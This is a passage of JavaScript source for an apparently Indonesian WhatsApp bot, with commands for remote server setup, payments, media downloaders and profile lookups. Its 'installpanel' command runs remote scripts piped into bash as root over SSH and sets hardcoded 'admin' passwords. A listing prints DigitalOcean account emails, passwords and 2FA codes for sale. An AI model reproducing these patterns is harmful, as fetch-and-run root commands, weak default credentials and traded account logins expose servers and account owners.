    if (stokdo.length < 1) return m.reply("Tidak ada stok digitalocean.");

    let messageText = "";
    stokdo.forEach((res, index) => {
        messageText += `\n* *ID Stok :* ${index + 1}\n`;
        messageText += `* *Email :* ${res.email}\n`;
        messageText += `* *Password :* ${res.password}\n`;
        messageText += `* *Kode 2FA :* ${res.kode2fa}\n`;
        messageText += `* *Referall :* ${res.referall}\n`;
        messageText += `* *Harga :* Rp${func.toRupiah(res.harga.toString())}\n`;
        messageText += `* *Droplet :* ${res.droplet}\n`;
    });

    return m.reply(messageText);
}
break;


// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "installpanel": {
if (!isOwner) return m.reply(msg.owner)
if (!text) return example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*")
let vii = text.split("|")
if (vii.length < 5) return example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*")
let sukses = false

const ress = new ssh2.Client();
const connSettings = {
 host: vii[0],
 port: '22',
 username: 'root',
 password: vii[1]
}

const pass = "admin1"
let passwordPanel = pass
const domainpanel = vii[2]
const domainnode = vii[3]
const ramserver = vii[4]
const deletemysql = `\n`
const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`

async function instalWings() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
ress.exec('bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
let teks = `
*Install Panel Telah Berhasil ✅*

*Berikut Detail Akun Panel Kamu 📦*

*👤 Username :* admin
*🔐 Password :* ${passwordPanel}
*🌐 ${domainpanel}*

Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Di Buat Oleh Bot Untuk Menjalankan Wings

*Command Menjalankan Wings*
*.startwings* ipvps|pwvps|tokenwings
`
await sock.sendMessage(m.chat, {text: teks}, {quoted: m})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes("Masukkan nama lokasi: ")) {
stream.write('Singapore\n');
}
if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
stream.write('Node By Skyzo\n');
}
if (data.toString().includes("Masukkan domain: ")) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes("Masukkan nama node: ")) {
stream.write('Node By Skyzo\n');
}
if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan Locid: ")) {
stream.write('1\n');
}
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('1\n');
}
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Enter the panel address (blank for any address)')) {
stream.write(`${domainpanel}\n`);
}
if (data.toString().includes('Database host username (pterodactyluser)')) {
stream.write('admin\n');
}
if (data.toString().includes('Database host password')) {
stream.write(`admin\n`);
}
if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
stream.write('admin@gmail.com\n');
}
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
m.reply(`Error Terjadi kesalahan :\n${data}`)
console.log('STDERR: ' + data);
});
})
}

async function instalPanel() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalWings()
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('0\n');
} 
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Database name (panel)')) {
stream.write('\n');
}
if (data.toString().includes('Database username (pterodactyl)')) {
stream.write('admin\n');
}
if (data.toString().includes('Password (press enter to use randomly generated password)')) {
stream.write('admin\n');
} 
if (data.toString().includes('Select timezone [Europe/Stockholm]')) {
stream.write('Asia/Jakarta\n');
} 
if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Email address for the initial admin account')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Username for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('First name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Last name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Password for the initial admin account')) {
stream.write(`${passwordPanel}\n`);
} 
if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) {
stream.write(`${domainpanel}\n`);
} 
if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) {
stream.write('y\n')
} 
if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) {
stream.write('1\n');
} 
if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('(yes/no)')) {
stream.write('y\n');
} 
if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Still assume SSL? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Please read the Terms of Service')) {
stream.write('y\n');
}
if (data.toString().includes('(A)gree/(C)ancel:')) {
stream.write('A\n');
} 
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
m.reply(`Error Terjadi kesalahan :\n${data}`)
console.log('STDERR: ' + data);
});
});
}

ress.on('ready', async () => {
await m.reply(`*Memproses install server panel 🚀*

* *Ip Address :* ${vii[0]}
* *Domain :* ${vii[2]}

Mohon tunggu 1 - 10 menit hingga proses install selsai`)
ress.exec(deletemysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalPanel();
}).on('data', async (data) => {
await stream.write('\t')
await stream.write('\n')
await console.log(data.toString())
}).stderr.on('data', async (data) => {
m.reply(`Error Terjadi kesalahan :\n${data}`)
console.log('Stderr : ' + data);
});
});
}).connect(connSettings);
}
break  

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "startwings": case "configurewings": {
if (!isOwner) return m.reply(msg.owner)
let t = text.split('|')
if (t.length < 3) return example("ipvps|pwvps|token_node")

let ipvps = t[0]
let passwd = t[1]
let token = t[2]

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `${token} && systemctl start wings`
const ress = new ssh2.Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("*Berhasil menjalankan wings ✅*")
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("y\n")
stream.write("systemctl start wings\n")
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "gantipw": case "gantipwvps": {
if (!isOwner) return m.reply(msg.owner)
let t = text.split('|')
if (t.length < 3) return example("ipvps|pwvps|pwbaru")

let ipvps = t[0]
let passwd = t[1]
let token = t[2]

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `passwd`
const ress = new ssh2.Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write(`${token}\n`)
stream.write(`${token}\n`)
if (data.includes("password updated successfully")) return m.reply(`
*Berhasil mengubah password Vps ✅*

* *Password lama :* ${passwd}
* *Password baru :* ${token}
`)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listgc": case "listgrup": {
if (!isOwner) return
let teks = `\n`
let a = await sock.groupFetchAllParticipating()
let gc = Object.values(a)
teks += `\n* *Total group :* ${gc.length}\n`
for (const u of gc) {
teks += `\n* *ID :* ${u.id}
* *Nama :* ${u.subject}
* *Member :* ${u.participants.length}
* *Status :* ${u.announce == false ? "Terbuka": "Hanya Admin"}
* *Pembuat :* ${u?.subjectOwner ? u?.subjectOwner.split("@")[0] : "Sudah Keluar"}\n`
}
return m.reply(teks)
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "done": case "proses": {
if (!isOwner) return m.reply(msg.owner)
if (!text) return example("jasa install panel")
let teks = `*Transaksi Telah Selesai Next Order✅*
* ${text}
* ${func.tanggal(Date.now())}

*Testimoni :*
* https://whatsapp.com/channel/0029Vax5meu35fLpVh5oUi2x
`
await sock.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, "0@s.whatsapp.net", global.owner+"@s.whatsapp.net"], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idsaluran,
   newsletterName: global.namasaluran
   }
  },}, {quoted: null})
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "dana": {
let tekspay = `
*Dana :* ${global.dana}
`
return sock.sendText(m.chat, tekspay, qtext)
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "ovo": {
let tekspay = `
*Ovo :* ${global.ovo}
`
return sock.sendText(m.chat, tekspay, qtext)
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "gopay": {
let tekspay = `
*Gopay :* ${global.gopay}
`
return sock.sendText(m.chat, tekspay, qtext)
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "qris": {
return sock.sendMessage(m.chat, {image: {url: global.qris}}, {quoted: qtext})
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "listown": case "listowner": {
if (ownplus.length < 1) return m.reply("Tidak ada owner tambahan!")
var teks = ""
teks += `\n @${global.owner}\n`
for (let i of ownplus) {
teks += `\n * @${i.split("@")[0]}\n`
}
await sock.sendMessage(m.chat, {text: teks, mentions: ownplus}, {quoted: m})
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case 'plays': case 'playspotify': {
  if (!text) return m.reply('Masukkan judul lagu!\nContoh: plays Jakarta Hari Ini');
  const res = await fetch(`https://api.nekorinn.my.id/downloader/spotifyplay?q=${encodeURIComponent(text)}`);
  if (!res.ok) return m.reply('Gagal mengambil data lagu.');
  const data = await res.json();
  if (!data.status) return m.reply('Lagu tidak ditemukan!');
  const { title, artist, duration, imageUrl, link } = data.result.metadata;
  const downloadUrl = data.result.downloadUrl;
  await sock.sendMessage(m.chat, {
    audio: { url: downloadUrl },
    mimetype: 'audio/mpeg',
    fileName: `${title}.mp3`,
    ptt: true, // true kalau mau dikirim sebagai VN
    contextInfo: {
      externalAdReply: {
        title: title,
        body: `${artist} • ${duration}`,
        mediaType: 2, 
        thumbnailUrl: imageUrl,
        renderLargerThumbnail: true,
        sourceUrl: link, 
        showAdAttribution: true
      }
    }
  }, { quoted: m });
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case 'plays':
case 'play': 
case 'ytplay': {
if (!text) return m.reply(`Example: ${prefix + command} Lagu sad`);
try {		
let search = await yts(`${text}`);
if (!search || search.all.length === 0) return m.reply(`*Lagu tidak ditemukan!* ☹️`);
let { videoId, image, title, views, duration, author, ago, url, description } = search.all[0];
let caption = `「 *YOUTUBE PLAY* 」\n\n🆔 ID : ${videoId}\n💬 Title : ${title}\n📺 Views : ${views}\n⏰ Duration : ${duration.timestamp}\n▶️ Channel : ${author.name}\n📆 Upload : ${ago}\n🔗 URL Video : ${url}\n📝 Description : ${description}`;
sock.sendMessage(m.chat,{
image: { url: image },
caption: caption,
footer: `${global.namaOwner}`,
buttons: [
{
buttonId: `${prefix}ytmp3 ${url}`,
buttonText: {
displayText: "YouTube Music"
}
},
{
buttonId: `${prefix}ytmp4 ${url}`,
buttonText: {
displayText: "YouTube Video"
}
},
{
buttonId: `${prefix}ytmp4-v2 ${url}`,
buttonText: {
displayText: "YouTube Video V2"
}
}
],
viewOnce: true,
}, {
quoted: m
});
} catch (err) {
console.error(err);
m.reply(`*Terjadi kesalahan!* 😭\n${err.message || err}`);
}
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "yts": {
if (!q) return example("lagu tiktok viral")
let data = await yts(q)
if (data.all.length < 1) return m.reply("Result tidak ditemukan!")
let anuan = data.all
let teks = ""
for (let res of anuan) {
teks += `\n* *Title :* ${res.title}
* *Durasi :* ${res.timestamp}
* *Upload :* ${res.ago}
* *Views :* ${await func.toRupiah(res.views) || "Unknown"}
* *Author :* ${res?.author?.name || "Unknown"}
* *Source :* ${res.url}\n`
}
await m.reply(teks)
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "xnxxs": case "xnxxsearch": {
if (!q) return example("step sister")
let data = await func.fetchJson(`https://restapi.simplebot.my.id/search/xnxx?apikey=${global.ApikeyRestApi}&q=${q}`)
if (data.result.length < 1) return m.reply("Result tidak ditemukan!")
let anuan = data.result
let teks = ""
for (let res of anuan) {
teks += `\n* *Title :* ${res.title}
* *Info :* ${res.info.trim()}
* *Link :* ${res.link}\n`
}
await m.reply(teks)
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "npm": case "npmsearch": {
if (!q) return example("axios")
let data = await func.fetchJson(`https://restapi.simplebot.my.id/search/npm?apikey=${global.ApikeyRestApi}&q=${q}`)
if (data.result.length < 1) return m.reply("Result tidak ditemukan!")
let anuan = data.result
let teks = ""
for (let res of anuan) {
teks += `\n* *${res.title}*
* *Update :* ${res.update.split("T").join(" ").split("Z")[0]}
* *Link :* ${res.links.npm}
* *Github :* ${res.links.repository}\n`
}
await m.reply(teks)
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "tiktoksearch": case "tiktoks": {
if (!q) return example("axios")
let data = await func.fetchJson(`https://restapi.simplebot.my.id/search/tiktok?apikey=${global.ApikeyRestApi}&q=${q}`)
if (data.result.length < 1) return m.reply("Result tidak ditemukan!")
let anuan = data.result
let teks = ""
for (let res of anuan) {
teks += `
* *Title :* ${res.title}
* *Views :* ${await func.toRupiah(res.play_count)}
* *Author :* ${res.author.nickname}
* *Upload :* ${func.tanggal(res.create_time)}
* *Vidio :* ${res.play}
* *Audio :* ${res.music_info.play}
`
}
await m.reply(teks)
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "xnxx": case "xnxxdl": {
if (!q) return example("linknya")
let data = await func.fetchJson(`https://restapi.simplebot.my.id/download/xnxx?apikey=${global.ApikeyRestApi}&url=${q}`)
if (!data.result) return m.reply("Result tidak ditemukan!")
await sock.sendMessage(m.chat, {video: {url: data.result.files.high || data.result.files.low}, caption: "XNXX Download Done ✅", mimetype: "video/mp4"}, {quoted: m})
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "ytmp4-v2":
case "ytvideo-v2": {
 if (!q) return m.reply(`Example: ${prefix + command} https://youtube.com/watch?v=CVLeZpg6Kzk 144/240/360/480/720/1080`);
 const args = q.split(' ');
 const url = args[0];
 const availableResolutions = ['144', '240', '360', '480', '720', '1080'];
 let quality = args[1] && availableResolutions.includes(args[1]) ? args[1] : '480';
 if (!url.match(/^(?:https?:\/\/)?(?:www\.)?(?:youtube\.com\/watch\?v=|youtu\.be\/)([a-zA-Z0-9_-]{11})/)) {
 return m.reply(`Please provide a valid YouTube URL\n\nAvailable resolutions: ${availableResolutions.join(', ')}`);
 }
 m.reply(mess.wait);
 try {
 const apiUrl = `https://api.hiuraa.my.id/downloader/savetube?url=${encodeURIComponent(url)}&format=${quality}`;
 const response = await fetch(apiUrl);
 const data = await response.json();
 if (!data.status || !data.result) {
 return m.reply('Failed to download the video');
 }
 const { title, duration, thumbnail, download } = data.result;
 await sock.sendMessage(m.chat, {
 image: { url: thumbnail },
 caption: `*${title}*\n*${quality}p* | *${duration}*`
 }, { quoted: m });
 
 await sock.sendMessage(m.chat, {
 video: { url: download },
 mimetype: 'video/mp4'
 }, { quoted: m });
 
 } catch (error) {
 console.error('Error downloading YouTube video:', error);
 m.reply('An error occurred while downloading the video');
 }
 }
 break
 
// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

 
case 'ytmp4': 
case 'ytvideo': 
case 'ytv': {
 if (!text) return m.reply(`Gunakan: ${prefix + command} <url> [resolusi]`); 
 let url = args[0]; 
 let resolution = args[1] && !isNaN(args[1]) ? args[1] : "720"; 
 try { 
 await sock.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
 let info = await getVideoInfo(url);
 if (!info || !info.status) return m.reply('❌ Gagal mendapatkan informasi video.');
 await sock.sendMessage(m.chat, { react: { text: '📥', key: m.key } });
 let video = await downloadVideo(url, resolution);
 if (!video.status || !video.downloadUrl) return m.reply('❌ Gagal mendapatkan file video.');
 let captionInfo = `📹 *${info.title}*\n👤 *Creator:* ${info.creator}\n⏳ *Durasi:* ${info.duration} detik\n📡 *Sumber:* ${video.source}\n🎥 *Resolusi:* ${resolution}p\n🔗 *URL:* ${info.url}`;
 await sock.sendMessage(m.chat, {
 image: { url: info.thumbnail },
 caption: captionInfo
 }, { quoted: m });
 await sock.sendMessage(m.chat, { react: { text: '📤', key: m.key } });
 let fileSize = await getFileSizeFromUrl(video.downloadUrl);
 let captionMedia = `📹 *${info.title}*\n👤 *${info.creator}*\n📡 *Sumber:* ${video.source}`;
 if (fileSize > 15 * 1024 * 1024) {
 await sock.sendMessage(m.chat, { 
 document: { url: video.downloadUrl },
 mimetype: 'video/mp4',
 fileName: `${info.title}.mp4`,
 caption: captionMedia
 }, { quoted: m });
 } else {
 await sock.sendMessage(m.chat, { 
 video: { url: video.downloadUrl },
 caption: captionMedia,
 fileName: `${info.title}.mp4`
 }, { quoted: m });
 }
 await sock.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
 } catch (err) { 
 console.error(err); 
 m.reply('❌ Terjadi kesalahan.'); 
 } 
} 
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //


case 'ytmp3': case 'ytaudio':
 if (!text) return m.reply('Masukkan judul lagu yang ingin dicari!');
 try {
 const axios = require('axios');
 const fs = require('fs');
 const path = require('path');
 await sock.sendMessage(m.chat, { react: { text: "⏱️", key: m.key } });
 let apiUrl = `https://api.alvianuxio.eu.org/api/play?query=${encodeURIComponent(text)}&apikey=kayzuMD&format=mp3`;
 let { data } = await axios.get(apiUrl, { timeout: 15000 });
 if (!data || !data.data || !data.data.response) {
 return m.reply('Gagal menemukan lagu.');
 }
 let song = data.data.response;
 let caption = `🎵 *Judul:* ${song.title}\n`
 + `⏳ *Durasi:* ${song.duration}\n`
 + `📅 *Upload:* ${song.uploadDate}\n`
 + `👀 *Views:* ${song.views?.toLocaleString() || 'N/A'}\n`
 + `🎤 *Channel:* ${song.channel?.name || 'Unknown'}\n`
 + `🔗 *Video:* ${song.videoUrl}\n`
 + `🎧 *Download:* ${song.download}`;
 const videoId = song.videoUrl.includes('v=') ? song.videoUrl.split('v=')[1].split('&')[0] : null;
 const thumbnailUrl = videoId ? `https://i.ytimg.com/vi/${videoId}/hqdefault.jpg` : null;
 await sock.sendMessage(m.chat, {
 text: caption,
 contextInfo: {
 externalAdReply: {
 showAdAttribution: true,
 title: song.title,
 body: `Music Player`,
 mediaType: 1,
 thumbnailUrl: thumbnailUrl,
 sourceUrl: song.videoUrl
 }
 }
 }, { quoted: m });
 const sanitizedTitle = song.title.replace(/[^\w\s-]/gi, '_').substring(0, 50);
 let audioPath = path.join(__dirname, `temp_${Date.now()}_${sanitizedTitle}.mp3`);
 try {
 const response = await axios({
 method: 'get',
 url: song.download,
 responseType: 'arraybuffer',
 timeout: 60000,
 headers: {
 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
 }
 });
 if (!response.data || response.data.length === 0) {
 throw new Error('Empty response data');
 }
 fs.writeFileSync(audioPath, Buffer.from(response.data));
 try {
 await sock.sendMessage(m.chat, {
 audio: fs.readFileSync(audioPath),
 mimetype: 'audio/mpeg',
 fileName: `${sanitizedTitle}.mp3`,
 }, { quoted: m });
 } catch (audioSendError) {
 await sock.sendMessage(m.chat, {
 document: fs.readFileSync(audioPath),
 mimetype: 'audio/mpeg',
 fileName: `${sanitizedTitle}.mp3`,
 }, { quoted: m });
 }
 if (fs.existsSync(audioPath)) {
 fs.unlinkSync(audioPath);
 }
 await sock.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
 } catch (downloadError) {
 try {
 const alternativeUrl = `https://api.akuari.my.id/downloader/youtube?link=${song.videoUrl}`;
 const altResponse = await axios.get(alternativeUrl);
 if (altResponse.data && altResponse.data.mp3) {
 const audioResponse = await axios({
 method: 'get',
 url: altResponse.data.mp3,
 responseType: 'arraybuffer',
 timeout: 60000
 });
 audioPath = path.join(__dirname, `temp_alt_${Date.now()}_${sanitizedTitle}.mp3`);
 fs.writeFileSync(audioPath, Buffer.from(audioResponse.data));
 await sock.sendMessage(m.chat, {
 document: fs.readFileSync(audioPath),
 mimetype: 'audio/mpeg',
 fileName: `${sanitizedTitle}.mp3`,
 }, { quoted: m });

 if (fs.existsSync(audioPath)) {
 fs.unlinkSync(audioPath);
 }
 await sock.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
 } else {
 throw new Error('Alternative API failed');
 }
 } catch (altError) {
 if (fs.existsSync(audioPath)) {
 fs.unlinkSync(audioPath);
 }
 m.reply('Gagal mengunduh audio. Coba lagi nanti.');
 await sock.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
 }
 }
 } catch (error) {
 m.reply('Terjadi kesalahan saat mencari atau memproses lagu.');
 await sock.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
 }
 break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "tiktok": case "tt": {
if (!text) return example("linknya")
m.reply("📥 Memproses tiktok downloader . .")
var anu = await func.fetchJson(`https://restapi.simplebot.my.id/download/tiktok?apikey=${global.ApikeyRestApi}&url=${text}`)
if (anu.status) {
if (anu.result.slides.length > 1) {
for (let i of anu.result.slides) {
await sock.sendFileUrl(m.chat, i.url, "Tiktok Download Done ✅", m)
}
} else {
await sock.sendMessage(m.chat, {video: {url: anu.result.video_nowm}, caption: "Tiktok Download Done ✅", mimetype: "video/mp4"}, {quoted: m})
}
await sock.sendMessage(m.chat, {audio: {url: anu.result.audio_url}, mimetype: "audio/mpeg"}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "gitclone": {
if (!text) return example("https://github.com/Skyzodev/Simplebot")
try {
let res = await await func.fetchJson(`https://restapi.simplebot.my.id/download/github?apikey=${global.ApikeyRestApi}&url=${text}`)
let filename = res.result.filename
let url = res.result.download
await sock.sendMessage(m.chat, { document: { url: url }, mimetype: 'application/zip', fileName: `${filename}`}, { quoted : m })
} catch (e) {
await m.reply(`Error! repositori tidak ditemukan`)
}}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "instagram": case "ig": {
if (!text) return example("linknya")
m.reply("📥 Memproses instagram downloader . .")
var anu = await func.fetchJson(`https://restapi.simplebot.my.id/download/instagram?apikey=${global.ApikeyRestApi}&url=${text}`)
if (anu.status) {
for (let i of anu.result.downloadUrls) {
await sock.sendFileUrl(m.chat, i, "Instagram Download Done ✅", m)
}
} else {
return m.reply("Error! Result Not Found")
}
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "facebook": case "fb": {
if (!text) return example("linknya")
m.reply("📥 Memproses facebook downloader . .")
var anu = await func.fetchJson(`https://restapi.simplebot.my.id/download/facebook?apikey=${global.ApikeyRestApi}&url=${text}`)
if (anu.status) {
await sock.sendMessage(m.chat, {video: {url: anu.result.media}, caption: "Facebook Download Done ✅"}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "videy": {
if (!text) return example("linknya")
m.reply("📥 Memproses videy downloader . .")
var anu = await func.fetchJson(`https://restapi.simplebot.my.id/download/videy?apikey=${global.ApikeyRestApi}&url=${text}`)
if (anu.status) {
await sock.sendMessage(m.chat, {video: {url: anu.result}, caption: "Videy Download Done ✅"}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "videy": {
if (!text) return example("linknya")
m.reply("📥 Memproses videy downloader . .")
try {
let res = await fetch(`https://videy.co/api/download?url=${encodeURIComponent(text)}`)
let json = await res.json()
        
if (!json.success) return m.reply("Error! Video tidak ditemukan")
        
let videoUrl = json.result.video_url
let videoTitle = json.result.title || "Video"
        
await sock.sendMessage(m.chat, {video: {url: videoUrl}, caption: `🎥 *${videoTitle}*`}, {quoted: m})
await sock.sendMessage(m.chat, {react: {text: '', key: m.key}})
} catch (e) {
return m.reply("Error! Result Not Found")
}
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case 'ytmp4': 
case 'ytvideo': 
case 'ytv': {
 if (!text) return m.reply(`Gunakan: ${prefix + command} <url> [resolusi]`); 
 let url = args[0]; 
 let resolution = args[1] && !isNaN(args[1]) ? args[1] : "720"; 
 try { 
 await sock.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
 let info = await getVideoInfo(url);
 if (!info || !info.status) return m.reply('❌ Gagal mendapatkan informasi video.');
 await sock.sendMessage(m.chat, { react: { text: '📥', key: m.key } });
 let video = await downloadVideo(url, resolution);
 if (!video.status || !video.downloadUrl) return m.reply('❌ Gagal mendapatkan file video.');
 let captionInfo = `📹 *${info.title}*\n👤 *Creator:* ${info.creator}\n⏳ *Durasi:* ${info.duration} detik\n📡 *Sumber:* ${video.source}\n🎥 *Resolusi:* ${resolution}p\n🔗 *URL:* ${info.url}`;
 await sock.sendMessage(m.chat, {
 image: { url: info.thumbnail },
 caption: captionInfo
 }, { quoted: m });
 await sock.sendMessage(m.chat, { react: { text: '📤', key: m.key } });
 let fileSize = await getFileSizeFromUrl(video.downloadUrl);
 let captionMedia = `📹 *${info.title}*\n👤 *${info.creator}*\n📡 *Sumber:* ${video.source}`;
 if (fileSize > 15 * 1024 * 1024) {
 await sock.sendMessage(m.chat, { 
 document: { url: video.downloadUrl },
 mimetype: 'video/mp4',
 fileName: `${info.title}.mp4`,
 caption: captionMedia
 }, { quoted: m });
 } else {
 await sock.sendMessage(m.chat, { 
 video: { url: video.downloadUrl },
 caption: captionMedia,
 fileName: `${info.title}.mp4`
 }, { quoted: m });
 }
 await sock.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
 } catch (err) { 
 console.error(err); 
 m.reply('❌ Terjadi kesalahan.'); 
 } 
} 
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "tourl": {
if (!/image|video/.test(mime)) return example("dengan kirim/reply foto")
const FormData = require('form-data');
const { fromBuffer } = require('file-type');
async function getUrls (buffer) {
  let { ext } = await fromBuffer(buffer);
  let bodyForm = new FormData();
  bodyForm.append("fileToUpload", buffer, "file." + ext);
  bodyForm.append("reqtype", "fileupload");
  let res = await fetch("https://catbox.moe/user/api.php", {
    method: "POST",
    body: bodyForm,
  });
  let data = await res.text();
  return data;
}
let media = await sock.downloadAndSaveMediaMessage(qmsg)
let teks = await getUrls(fs.readFileSync(media))
await sock.sendMessage(m.chat, {text: teks}, {quoted: m})
await fs.unlinkSync(media)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tiktokstalk": case "ttstalk": {
if (!text) return example("username")
try {
const res = await func.fetchJson(`https://restapi.simplebot.my.id/stalk/tiktok?apikey=${global.ApikeyRestApi}&user=${text}`)
if (!res.status) return m.reply("Error nama pengguna tidak ditemukan")
const teks = `
* *Nama :* ${res.result.nickname}
* *Username :* ${res.result.uniqueId}
* *Bio :* ${res?.result?.signature || ""}
* *Followers :* ${res.result.followerCount}
* *Following :* ${res.result.followingCount}
* *Private :* ${res.result.privateAccount == true ? "Ya" : "Tidak"}
`
await sock.sendMessage(m.chat, {image: {url: res.result.avatarMedium}, caption: teks}, {quoted: m})
} catch (err) {
return m.reply("Error : "+err)
}
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "igstalk": {
if (!text) return example("username")
try {
let res = await func.fetchJson(`https://restapi.simplebot.my.id/stalk/instagram?apikey=${global.ApikeyRestApi}&user=${q}`)
const teks = `
* *Nama :* ${res.result.name}
* *Username :* ${res.result.username}
* *Bio :* ${res.result.bio}
* *Total Postingan :* ${res.result.posts}
* *Followers :* ${res.result.followers}
* *Following :* ${res.result.following}
`
await sock.sendMessage(m.chat, {image: {url: res.result.avatar}, caption: teks}, {quoted: m})
} catch (err) {
return m.reply("Error : "+err)
}
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "remini": case "tohd": case "hd": {
if (!/image/.test(mime)) return example("dengan kirim/reply foto")
m.reply(`🚀 Memproses ${command.toLowerCase()} foto . . `)
const FormData = require('form-data');
const { fromBuffer } = require('file-type');
async function getUrls (buffer) {
